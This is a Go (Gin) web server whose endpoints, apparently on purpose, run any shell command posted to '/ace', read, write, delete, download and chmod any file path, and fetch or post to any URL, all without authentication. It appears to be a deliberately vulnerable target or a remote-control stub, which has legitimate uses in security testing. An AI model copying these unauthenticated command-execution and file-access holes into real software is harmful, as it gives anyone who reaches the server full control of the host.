package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path"
	"path/filepath"

	"github.com/gin-gonic/gin"
	"github.com/mattn/go-shellwords"
)

type Argument struct {
	Arg  string `json:"arg" form:"arg" binding:"required"`
	Arg2 string `json:"arg2" form:"arg2"`
}

func main() {
	r := gin.Default()

	r.GET("/ping", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{
			"message": "pong",
		})
	})

	r.POST("/ace", func(c *gin.Context) {
		var form Argument
		if err := c.Bind(&form); err != nil {
			c.JSON(400, gin.H{
				"error": "failed to parse param",
			})
			return
		}
		cmd, err := shellwords.Parse(form.Arg)
		if err != nil {
			c.JSON(500, gin.H{
				"arg":   form.Arg,
				"error": fmt.Sprint(err),
			})
			return
		}
		switch len(cmd) {
		case 0:
			c.JSON(400, gin.H{
				"arg":   form.Arg,
				"error": "command length is 0",
			})
		case 1:
			out, err := exec.Command(cmd[0]).Output()
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": string(out),
			})
		default:
			out, err := exec.Command(cmd[0], cmd[1:]...).Output()
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": string(out),
			})
		}
	})

	f := r.Group("/file")
	{
		f.POST("/create", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			file, err := os.OpenFile(form.Arg, os.O_CREATE, 0666)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			defer file.Close()
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": "OK",
			})
		})

		f.POST("/read", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			out, err := os.ReadFile(form.Arg)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": string(out),
			})
		})

		f.POST("/append", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			if len(form.Arg2) == 0 {
				c.JSON(400, gin.H{
					"error": "arg2 length is 0",
				})
				return
			}
			file, err := os.OpenFile(form.Arg, os.O_WRONLY|os.O_APPEND, 0666)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			defer file.Close()
			fmt.Fprintln(file, form.Arg2)
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": "OK",
			})
		})

		f.POST("/delete", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			err := os.Remove(form.Arg)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": "OK",
			})
		})

		f.POST("/download", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			u, err := url.Parse(form.Arg)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			resp, err := http.Get(u.String())
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			defer resp.Body.Close()
			out, err := os.Create(filepath.Join(form.Arg2, path.Base(u.Path)))
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			defer out.Close()
			_, err = io.Copy(out, resp.Body)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": "OK",
			})
		})

		f.POST("/chmod", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			err := os.Chmod(form.Arg, 0766)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"result": "OK",
			})
		})
	}

	h := r.Group("/http")
	{
		h.POST("/get", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			client := &http.Client{
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}
			resp, err := client.Get(form.Arg)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			defer resp.Body.Close()
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"status": resp.Status,
				"result": string(body),
			})
		})

		h.POST("/json", func(c *gin.Context) {
			var form Argument
			if err := c.Bind(&form); err != nil {
				c.JSON(400, gin.H{
					"error": "failed to parse param",
				})
				return
			}
			client := &http.Client{
				CheckRedirect: func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				},
			}
			resp, err := client.Post(form.Arg, "application/json", bytes.NewBuffer([]byte(form.Arg2)))
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			defer resp.Body.Close()
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				c.JSON(500, gin.H{
					"arg":   form.Arg,
					"error": fmt.Sprint(err),
				})
				return
			}
			c.JSON(200, gin.H{
				"arg":    form.Arg,
				"status": resp.Status,
				"result": string(body),
			})
		})
	}
	if err := r.Run(); err != nil {
		panic(err)
	}
}
